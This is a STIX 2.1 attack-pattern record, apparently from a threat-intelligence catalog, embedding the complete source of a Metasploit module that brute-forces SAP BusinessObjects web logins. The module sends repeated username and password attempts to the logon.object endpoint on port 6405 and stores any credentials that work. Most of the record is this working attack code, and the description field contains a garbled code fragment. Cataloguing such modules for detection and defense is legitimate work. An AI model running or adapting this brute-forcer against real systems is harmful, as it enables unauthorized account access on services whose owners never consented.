{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6d6fc80-8cb6-4a17-aff9-6961aba9945e",
    "created": "2024-08-14T16:29:04.562129Z",
    "modified": "2024-08-14T16:29:04.562132Z",
    "name": "SAP BusinessObjects Web User Bruteforcer",
    "description": "This module simply attempts to bruteforce SAP BusinessObjects users by using CmcApp. 'References'  => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/sap_businessobjects_user_brute_web.rb",
            "external_id": "sap_businessobjects_user_brute_web.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'\t\t   => 'SAP BusinessObjects Web User Bruteforcer',\n      'Description'\t=> 'This module simply attempts to bruteforce SAP BusinessObjects users by using CmcApp.',\n      'References'  =>\n        [\n          # General\n          [ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]\n        ],\n      'Author'\t\t => [ 'Joshua Abraham <jabra[at]rapid7.com>' ],\n      'License'\t\t=> MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(6405),\n      ])\n    register_autofilter_ports([ 6405 ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri'\t => \"/PlatformServices/service/app/logon.object\",\n      'method'  => 'GET'\n    }, 25)\n    return if not res\n\n    each_user_pass { |user, pass|\n      enum_user(user,pass)\n    }\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def enum_user(user, pass)\n    vprint_status(\"#{rhost}:#{rport} - Trying username:'#{user}' password: '#{pass}'\")\n    success = false\n    data = 'isFromLogonPage=true&cms=127.0.1%3A6400'\n    data << \"&username=#{Rex::Text.uri_encode(user.to_s)}\"\n    data << \"&password=#{Rex::Text.uri_encode(pass.to_s)}\"\n    data << '&authType=secEnterprise&backUrl=%2FApp%2Fhome.faces'\n    begin\n      res = send_request_cgi({\n        'uri'\t\t  => '/PlatformServices/service/app/logon.object',\n        'data'\t\t => data,\n        'method'\t   => 'POST',\n        'headers'\t  =>\n              {\n                'Connection' => \"keep-alive\",\n                'Accept-Encoding' => \"gzip,deflate\",\n              },\n      }, 45)\n      return :abort if (!res or (res and res.code != 200))\n      if(res.body.match(/Account Information/i))\n        success = false\n      else\n        success = true\n        success\n      end\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"[SAP BusinessObjects] Unable to attempt authentication\")\n      return :abort\n    end\n\n    if success\n      print_good(\"[SAP BusinessObjects] Successful login '#{user}' password: '#{pass}'\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'sap-businessobjects',\n        user: user,\n        password: pass,\n        proof: res.body\n      )\n      return :next_user\n    else\n      vprint_error(\"[SAP BusinessObjects] failed to login as '#{user}' password: '#{pass}'\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Joshua Abraham <jabra[at]rapid7.com> ]",
        ""
    ]
}